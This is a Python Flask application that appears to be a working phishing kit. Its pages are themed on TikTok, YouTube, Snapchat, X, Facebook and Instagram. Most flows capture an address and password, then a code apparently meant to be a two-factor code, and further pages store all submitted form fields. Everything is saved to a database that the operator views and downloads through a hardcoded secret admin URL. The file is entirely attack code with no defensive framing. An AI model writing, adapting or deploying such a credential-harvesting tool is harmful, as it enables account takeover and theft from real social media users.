from flask import Flask, render_template, request, redirect, url_for, send_file, flash
import sqlite3, os, csv
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET", "change-me")

DB_FILE = "submissions.db"
ADMIN_SECRET = "supersecret-admin-2025"

ICON_MAP = {
    "joy1_1": ("fa-brands fa-tiktok", "#000000"),
    "joy1_2": ("fa-brands fa-tiktok", "#000000"),
    "joy2_1": ("fa-brands fa-youtube", "#FF0000"),
    "joy2_2": ("fa-brands fa-youtube", "#FF0000"),
    "happy1_1": ("fa-brands fa-snapchat", "#FFFC00"),
    "happy1_2": ("fa-brands fa-snapchat", "#FFFC00"),
    "happy2_1": ("fa-brands fa-x-twitter", "#000000"),
    "happy2_2": ("fa-brands fa-x-twitter", "#000000"),
    "love1_1": ("fa-brands fa-facebook-f", "#1877F2"),
    "love1_2": ("fa-brands fa-facebook-f", "#1877F2"),
    "love2_1": ("fa-brands fa-instagram", "#E1306C"),
    "love2_2": ("fa-brands fa-instagram", "#E1306C"),
    "f1": ("fa-solid fa-file", "#666"),
    "f2": ("fa-solid fa-file", "#666"),
    "m1": ("fa-solid fa-circle-check", "#10B981")
}

def init_db():
    if not os.path.exists(DB_FILE):
        with sqlite3.connect(DB_FILE) as conn:
            conn.execute('''
                CREATE TABLE IF NOT EXISTS submissions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT,
                    page TEXT,
                    user TEXT,
                    data TEXT,
                    icon TEXT
                )
            ''')
            conn.commit()

init_db()

def save_submission(page, user, data):
    icon = ICON_MAP.get(page, ("fa-solid fa-file", "#333"))[0]
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("INSERT INTO submissions (timestamp, page, user, data, icon) VALUES (?,?,?,?,?)",
                     (datetime.utcnow().isoformat(), page, user, data, icon))
        conn.commit()

def extract_user(form):
    for key in ("address","email","phone","fullname","street","username"):
        val = form.get(key)
        if val:
            return val.strip()
    return "anonymous"

@app.route('/')
def index():
    return render_template('index.html')

# Generic route pattern implemented explicitly for each flow per spec
@app.route('/joy1_1', methods=['GET','POST'])
def joy1_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('joy1_1', user, f'address={addr}; password={pwd}')
        return redirect(url_for('joy1_2'))
    return render_template('joy1_1.html')

@app.route('/joy1_2', methods=['GET','POST'])
def joy1_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('joy1_2', user, f'digits={digits}')
        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
    return render_template('joy1_2.html')

@app.route('/joy2_1', methods=['GET','POST'])
def joy2_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('joy2_1', user, f'address={addr}; password={pwd}')
        return redirect(url_for('joy2_2'))
    return render_template('joy2_1.html')

@app.route('/joy2_2', methods=['GET','POST'])
def joy2_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('joy2_2', user, f'digits={digits}')
        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
    return render_template('joy2_2.html')

@app.route('/happy1_1', methods=['GET','POST'])
def happy1_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('happy1_1', user, f'address={addr}; password={pwd}')
        return redirect(url_for('happy1_2'))
    return render_template('happy1_1.html')

@app.route('/happy1_2', methods=['GET','POST'])
def happy1_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('happy1_2', user, f'digits={digits}')
        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
    return render_template('happy1_2.html')

@app.route('/happy2_1', methods=['GET','POST'])
def happy2_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('happy2_1', user, f'address={addr}; password={pwd}')
        return redirect(url_for('happy2_2'))
    return render_template('happy2_1.html')

@app.route('/happy2_2', methods=['GET','POST'])
def happy2_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('happy2_2', user, f'digits={digits}')
        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
    return render_template('happy2_2.html')

@app.route('/love1_1', methods=['GET','POST'])
def love1_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('love1_1', user, f'address={addr}; password={pwd}')
        return redirect(url_for('love1_2'))
    return render_template('love1_1.html')

@app.route('/love1_2', methods=['GET','POST'])
def love1_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('love1_2', user, f'digits={digits}')
        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
    return render_template('love1_2.html')

@app.route('/love2_1', methods=['GET','POST'])
def love2_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('love2_1', user, f'address={addr}; password={pwd}')
        return redirect(url_for('love2_2'))
    return render_template('love2_1.html')

@app.route('/love2_2', methods=['GET','POST'])
def love2_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('love2_2', user, f'digits={digits}')
        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
    return render_template('love2_2.html')

@app.route('/f1', methods=['GET','POST'])
def f1():
    if request.method == 'POST':
        user = extract_user(request.form)
        items = [f"{k}: {v}" for k,v in request.form.items()]
        save_submission('f1', user, " ; ".join(items))
        return redirect(url_for('f2'))
    return render_template('f1.html')

@app.route('/f2', methods=['GET','POST'])
def f2():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('f2', user, f'address={addr}; password={pwd}')
        return redirect(url_for('m1'))
    return render_template('f2.html')

@app.route('/m1')
def m1():
    return render_template('m1.html')

@app.route(f"/admin/{ADMIN_SECRET}")
def admin():
    with sqlite3.connect(DB_FILE) as conn:
        rows = conn.execute('SELECT id, timestamp, page, user, data, icon FROM submissions ORDER BY id DESC').fetchall()
    colors = ['#f8fbff', '#ffffff']
    user_color = {}
    idx = 0
    for r in reversed(rows):
        u = r[3] or 'anonymous'
        if u not in user_color:
            user_color[u] = colors[idx % len(colors)]
            idx += 1
    return render_template('admin.html', submissions=rows, user_color=user_color, secret=ADMIN_SECRET)

@app.route(f"/admin/{ADMIN_SECRET}/clear", methods=['POST'])
def admin_clear():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('DELETE FROM submissions')
        conn.commit()
    flash('All submissions cleared.')
    return redirect(url_for('admin'))

@app.route(f"/admin/{ADMIN_SECRET}/download")
def download():
    csv_path = 'submissions_export.csv'
    with sqlite3.connect(DB_FILE) as conn:
        rows = conn.execute('SELECT id, timestamp, page, user, data FROM submissions ORDER BY id DESC').fetchall()
    with open(csv_path, 'w', newline='', encoding='utf-8') as csvf:
        writer = csv.writer(csvf)
        writer.writerow(['id','timestamp','page','user','data'])
        writer.writerows(rows)
    return send_file(csv_path, as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT',5000)), debug=True)
